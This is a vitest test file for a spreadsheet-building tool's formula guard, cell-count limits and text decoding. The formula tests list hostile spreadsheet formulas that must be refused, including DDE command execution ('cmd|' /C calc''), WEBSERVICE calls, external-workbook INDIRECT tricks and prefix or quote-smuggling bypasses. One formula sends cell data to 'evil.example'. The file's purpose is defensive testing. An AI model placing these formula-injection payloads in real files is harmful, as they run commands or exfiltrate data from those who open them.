/**
 * Fix round 1 and 2 guards outside the zip readers: the formula guard (functions passed as values,
 * INDIRECT, words inside text, any chain of the file format's prefixes), the spreadsheet cell limit
 * as the MCP SDK counts it, and decoding text files that aren't UTF-8.
 */
import { describe, expect, it } from "vitest";
import { ToolError } from "../../src/core/errors";
import { decodeTextNote, LEGACY_NOTE, looksLikeText } from "../../src/docs/extract/classify";
import { extractText } from "../../src/docs/extract/index";
import { buildSheets, checkFormula, cleanSheetNames, checkInputElements, inputElements, TOO_MANY_CELLS } from "../../src/docs/sheets";

describe("formula guard", () => {
	it("refuses functions passed as values (Excel 365 eta lambdas) and prefixed names", () => {
		for (const f of ["=MAP(A2:A3,WEBSERVICE)", "=A1:WEBSERVICE(B1)", "=DDE:DDE (A1)", "=MAP(A2,IMAGE)", "=BYROW(A1:A3,_xlfn.WEBSERVICE)", "=SCAN(,A1:A3,HYPERLINK)", "=LET(f,FILTERXML,f(A1,B1))", "=_xlfn.IMAGE(A1)", "=webservice (A1)", "=REGISTER.ID(A1,B1)"]) {
			expect(() => checkFormula(f, "cell"), f).toThrow(ToolError);
		}
	});
	it("refuses INDIRECT, which can build a link to another workbook out of CHAR(91)", () => {
		for (const f of ["=INDIRECT(\"'C:\\x\\\"&CHAR(91)&\"b.xlsx\"&CHAR(93)&\"S'!A1\")", "=INDIRECT(A1)", "=SUM(INDIRECT(\"A1:A3\"))"]) {
			expect(() => checkFormula(f, "cell"), f).toThrow(ToolError);
		}
	});
	it("refuses links to other workbooks and DDE outside text, and newer online functions", () => {
		for (const f of ["='[Book.xlsx]Sheet1'!A1", "=cmd|' /C calc'!A0", "=TRANSLATE(A1,\"en\",\"fr\")", "=STOCKHISTORY(\"MSFT\",A1)", "=PY(A1)", "=COPILOT(\"x\")", "=IMPORTCSV(\"https://x\")"]) {
			expect(() => checkFormula(f, "cell"), f).toThrow(ToolError);
		}
	});
	it("allows ordinary formulas, cell and column references that look like names, and words inside text", () => {
		for (const f of ["=SUM(A1:A3)*2", '=IF(A1>0,"See INFO","")', '="[draft] "&A1', "=RTD1+$DDE$2", "=SUM(DDE:DDE)", "=PY2*2", '="He said ""CELL"""&B1', "=CELLS_A+1"]) {
			expect(() => checkFormula(f, "cell"), f).not.toThrow();
		}
	});
	it("a quote that never closes hides nothing", () => {
		expect(() => checkFormula('="abc&WEBSERVICE(A1)', "cell")).toThrow(ToolError);
	});
	it("fix round 2: any chain of the file format's prefixes, in any case (the stored form of _xlws functions)", () => {
		for (const f of ['=_xlfn._xlws.WEBSERVICE("http://a")', '=_xlfn._xlfn.DDE("a","b","c")', '=_xlfn._xlws.PY("x")', '=_XLFN._XLWS.IMPORTCSV("x")', "=_xlfn._xlws.webservice (A1)", "=MAP(A2:A3,_xlfn._xlws.WEBSERVICE)", "=_xlfn._xlpm.COPILOT(A1)", "=SUM(1,_xlfn._xludf.CALL(A1))"]) {
			expect(() => checkFormula(f, "cell"), f).toThrow(ToolError);
		}
		// Ordinary functions in their stored forms stay allowed.
		for (const f of ["=_xlfn._xlws.FILTER(A1:A9,B1:B9>0)", "=_xlfn._xlws.SORT(A1:A9)", "=_xlfn.XLOOKUP(A1,B:B,C:C)", "=_xlfn.LET(_xlpm.x,2,_xlpm.x*3)"]) {
			expect(() => checkFormula(f, "cell"), f).not.toThrow();
		}
	});
	it("fix round 3: a double quote inside a single-quoted sheet name can't hide a function after it", () => {
		// Excel allows '"' in a sheet name. A fake string opened by that quote used to hide WEBSERVICE,
		// HYPERLINK and DDE placed between two such sheet names. All three are now refused.
		for (const f of [`='x"y'!A1&WEBSERVICE("http://e")&'p"q'!A1`, `='x"y'!A1+cmd|'/c calc'!A0+'p"q'!A1`, `='x"y'!A1&HYPERLINK("http://e","c")&'p"q'!A1`]) {
			expect(() => checkFormula(f, "cell"), f).toThrow(ToolError);
		}
		// A '[' (a link to another workbook) inside a single-quoted sheet name is still seen.
		expect(() => checkFormula(`='[Book.xlsx]Sheet1'!A1`, "cell")).toThrow(ToolError);
		// Ordinary single-quoted sheet references stay allowed, and a quoted word in a double-quoted
		// text literal still doesn't count.
		for (const f of [`='My Sheet'!A1+'Another Sheet'!B2`, `='Q1 2026'!A1*2`, `="it's a WEBSERVICE note"&A1`]) {
			expect(() => checkFormula(f, "cell"), f).not.toThrow();
		}
	});
	it("fix round 3: a double quote is stripped from a sheet name, and the full build refuses the bypass formula", () => {
		// cleanSheetNames removes '"' as it does []:*?/\, so a sheet can't carry a quote at all.
		expect(cleanSheetNames([`x"y`, `p"q`])).toEqual(["x y", "p q"]);
		// The real build (buildSheets -> the formula column -> checkFormula) refuses the smuggled call,
		// so no file with it is ever produced.
		expect(() =>
			buildSheets([
				{ name: `x"y`, columns: [{ header: "F", type: "formula" }], rows: [[`='x"y'!A1&WEBSERVICE("https://evil.example/?d="&'p"q'!A2)`]] },
				{ name: `p"q`, rows: [["x"]] },
			]),
		).toThrow(ToolError);
	});
});

describe("spreadsheet cell limit, counted as the MCP SDK counts input elements", () => {
	it("counts as toolInputElementCount in @modelcontextprotocol/server 2.3.1 does: every array item and object key", () => {
		// 3 top-level keys, 1 sheet, its 2 keys (name, rows), 2 rows, 3 values.
		expect(inputElements({ path: "/a.xlsx", sheets: [{ name: "S", rows: [[1, 2], [3]] }], if_exists: "fail" }, 50_000)).toBe(11);
		// A column setting is the item plus its keys; null values count as array items too.
		expect(inputElements({ sheets: [{ columns: [{ header: "a", type: "text" }], rows: [[null]] }] }, 50_000)).toBe(9);
		// Scalars and empty containers add nothing; counting stops once past the cap.
		expect(inputElements("x", 5)).toBe(0);
		expect(inputElements({ a: [] }, 5)).toBe(1);
		expect(inputElements({ rows: Array.from({ length: 100 }, () => [1, 2, 3]) }, 50)).toBe(51);
	});
	it("refuses in plain words just past 50,000 elements, and lets 50,000 through", () => {
		// 3 + 1 + 1 (rows) + 100 rows of 499 values = 50,005: over.
		const over = { path: "/a.xlsx", sheets: [{ rows: Array.from({ length: 100 }, () => Array.from({ length: 499 }, () => 1)) }], if_exists: "fail" };
		expect(inputElements(over, 60_000)).toBe(50_005);
		expect(() => checkInputElements(over)).toThrow(TOO_MANY_CELLS);
		// Five values fewer: exactly 50,000, allowed (buildSheets then counts the cells themselves).
		const at = { ...over, sheets: [{ rows: over.sheets[0]?.rows.map((r, i) => (i === 0 ? r.slice(0, 494) : r)) ?? [] }] };
		expect(inputElements(at, 60_000)).toBe(50_000);
		expect(() => checkInputElements(at)).not.toThrow();
		expect(buildSheets(at.sheets as never).summary[0]).toMatchObject({ rows: 99, columns: 499 });
	});
	it("the cells themselves: at most 50,000 with the header rows, also from CSV", () => {
		const rows = Array.from({ length: 101 }, () => Array.from({ length: 500 }, () => 1));
		expect(() => buildSheets([{ rows }])).toThrow(TOO_MANY_CELLS);
		expect(buildSheets([{ rows: rows.slice(0, 100) }]).summary[0]).toMatchObject({ rows: 99, columns: 500 });
	});
});

describe("text that isn't UTF-8", () => {
	it("Windows-1252 bytes are read as Windows-1252, and said so", async () => {
		expect(decodeTextNote(new Uint8Array([0x63, 0x61, 0x66, 0xe9, 0x2c, 0x31, 0x0d, 0x0a, 0x80, 0x35]))).toEqual({ text: "café,1\n€5", legacy: true });
		const r = await extractText(new Uint8Array([0x63, 0x61, 0x66, 0xe9, 0x2c, 0x31]), { name: "latin1.csv", mime: null, offset: 0, maxChars: 1000 });
		expect(r).toEqual({ text: "café,1", format: "csv", totalChars: 6, cut: false, note: LEGACY_NOTE });
	});
	it("UTF-8 stays UTF-8, also when a ranged read cut its last character short", () => {
		const euro = new TextEncoder().encode("price 5€");
		expect(decodeTextNote(euro)).toEqual({ text: "price 5€", legacy: false });
		expect(decodeTextNote(euro.subarray(0, euro.length - 1))).toEqual({ text: "price 5", legacy: false });
		expect(decodeTextNote(new Uint8Array([0xef, 0xbb, 0xbf, 0x68, 0x69]))).toEqual({ text: "hi", legacy: false });
		expect(decodeTextNote(new Uint8Array([0xff, 0xfe, 0x68, 0x00]))).toEqual({ text: "h", legacy: false });
	});
	it("8-bit text without a known extension still looks like text", () => {
		const latin = new Uint8Array(Array.from("Ça coûte très cher à Noël, déjà vu. ".repeat(20), (ch) => ch.charCodeAt(0)));
		expect(looksLikeText(latin)).toBe(true);
		expect(looksLikeText(new Uint8Array([0x01, 0x02, 0x03, 0x04, 0x61]))).toBe(false);
	});
});
